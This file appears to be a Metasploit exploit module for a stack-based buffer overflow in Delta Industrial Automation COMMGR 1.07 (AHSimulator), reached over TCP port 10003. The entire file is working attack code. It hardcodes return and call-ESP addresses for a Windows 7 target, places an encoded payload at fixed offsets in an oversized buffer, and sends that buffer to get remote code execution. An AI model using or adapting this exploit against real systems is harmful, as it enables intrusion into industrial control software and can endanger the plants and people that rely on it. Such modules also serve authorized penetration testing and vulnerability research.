require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Delta Industrial Automation COMMGR AHSimulator Simulator Stack-based Buffer Overflow',
      'Description'    => %q{
	This module exploits a vulnerability in COMMGR 1.07. When sending a 
	specially formatted packet to TCP port 10003, and exception occurs that may lead
	to arbitrary code execution.
      },
      'Author'         => 'Mario Ceballos',
      'License'        => 'BSD_LICENSE',
      'References'     =>
        [
          ['URL', 'http://'],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Payload'        =>
        {
          'Space'    => 425,
          'BadChars' => "\x00\x0a\x0d\x20",
          'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'AHSimulator.exe (1.0.0.0) / Windows 7 English', { 'Ret' => 0x405587, 'Flip' => 0x65f1b7, 'CallESP' => 0x404559 }, ], 
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Oct 19 2018',
      'DefaultTarget' => 0))

    register_options(
      [
        Opt::RPORT(10003)
      ], self.class)

  end

  def exploit
    connect

    ret     = [target['Ret']].pack('V') * 12
    callesp = [target['CallESP']].pack('V')

    print_status("Trying target #{target.name}...")

    sploit = rand_text_alpha_upper(9024)
    sploit[628,  ret.size] = ret
    sploit[676,  callesp.size + payload.encoded.size] = callesp + payload.encoded
    sploit[4196, 4] = [target['Flip']].pack('V')

    sock.put(sploit + "\r\n\r\n")

    handler
    disconnect
  end

end
